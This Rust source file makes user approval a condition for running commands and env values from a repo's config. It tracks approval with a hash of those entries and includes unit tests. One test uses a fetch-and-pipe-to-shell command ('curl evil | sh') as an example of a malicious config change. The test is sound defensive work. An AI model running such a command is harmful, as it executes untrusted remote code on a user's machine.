//! Trust for commands from a repo's config (docs/config.md "Trust"): a
//! repo's file is written by whoever can push to it, so its commands run
//! only once you allow them. Approval is stored per project against a hash
//! of the repo-provided set in effect; any change asks again.

use sha2::{Digest, Sha256};
use theodore_contract::{ConfigEntry, ConfigLayer, RepoCommands};

use super::Merged;

/// Keys whose repo-layer value is gated: the commands, and `env`, which
/// can change what any command runs (`PATH`, …).
pub fn is_gated(key: &str) -> bool {
    matches!(
        key,
        "spaces.setup" | "spaces.run" | "spaces.check" | "spaces.archive"
    ) || key.starts_with("spaces.env.")
}

/// The gated entries whose effective value comes from the repo layer, or
/// `None` when there are none (nothing to ask about).
pub fn repo_commands(merged: &Merged, trusted_hash: Option<&str>) -> Option<RepoCommands> {
    let items: Vec<ConfigEntry> = merged
        .entries()
        .into_iter()
        .filter(|e| e.layer == ConfigLayer::Repo && is_gated(&e.key))
        .collect();
    if items.is_empty() {
        return None;
    }
    let hash = hash(&items);
    Some(RepoCommands {
        trusted: trusted_hash == Some(hash.as_str()),
        hash,
        items,
    })
}

/// sha256 over `key\0value\0` of each item, in key order.
pub fn hash(items: &[ConfigEntry]) -> String {
    let mut sorted: Vec<&ConfigEntry> = items.iter().collect();
    sorted.sort_by(|a, b| a.key.cmp(&b.key));
    let mut h = Sha256::new();
    for e in sorted {
        h.update(e.key.as_bytes());
        h.update([0]);
        h.update(e.value.as_bytes());
        h.update([0]);
    }
    hex::encode(h.finalize())
}

#[cfg(test)]
mod tests {
    use std::path::PathBuf;

    use super::*;
    use crate::config::{LayerText, merge};

    fn layer(layer: ConfigLayer, text: &str) -> LayerText {
        LayerText {
            layer,
            path: PathBuf::from(format!("/{layer:?}")),
            legacy: false,
            text: Some(text.into()),
        }
    }

    #[test]
    fn nothing_from_the_repo_needs_no_approval() {
        let m = merge(&[
            layer(ConfigLayer::Global, "spaces: {setup: make}"),
            layer(ConfigLayer::Repo, "spaces: {ports: 2, copy: [.env]}"),
        ]);
        assert_eq!(repo_commands(&m, None), None);
    }

    #[test]
    fn repo_commands_and_env_are_gated_and_hashed() {
        let m = merge(&[layer(
            ConfigLayer::Repo,
            "spaces: {setup: pnpm i, run: pnpm dev, env: {A: b}, ports: 1}",
        )]);
        let rc = repo_commands(&m, None).unwrap();
        let keys: Vec<&str> = rc.items.iter().map(|e| e.key.as_str()).collect();
        assert_eq!(keys, ["spaces.env.A", "spaces.run", "spaces.setup"]);
        assert!(!rc.trusted);
        assert_eq!(rc.hash.len(), 64);
        assert!(repo_commands(&m, Some(&rc.hash)).unwrap().trusted);
    }

    #[test]
    fn a_changed_command_changes_the_hash() {
        let a = merge(&[layer(ConfigLayer::Repo, "spaces: {setup: pnpm i}")]);
        let b = merge(&[layer(ConfigLayer::Repo, "spaces: {setup: curl evil | sh}")]);
        let ha = repo_commands(&a, None).unwrap().hash;
        let hb = repo_commands(&b, Some(&ha)).unwrap();
        assert_ne!(ha, hb.hash);
        assert!(!hb.trusted);
    }

    #[test]
    fn a_local_override_takes_the_command_out_of_the_set() {
        let m = merge(&[
            layer(ConfigLayer::Repo, "spaces: {setup: pnpm i, run: pnpm dev}"),
            layer(ConfigLayer::Local, "spaces: {run: pnpm dev:mine}"),
        ]);
        let rc = repo_commands(&m, None).unwrap();
        let keys: Vec<&str> = rc.items.iter().map(|e| e.key.as_str()).collect();
        assert_eq!(keys, ["spaces.setup"]);
        let only_local = merge(&[
            layer(ConfigLayer::Repo, "spaces: {run: pnpm dev}"),
            layer(ConfigLayer::Local, "spaces: {run: pnpm dev:mine}"),
        ]);
        assert_eq!(repo_commands(&only_local, None), None);
    }
}
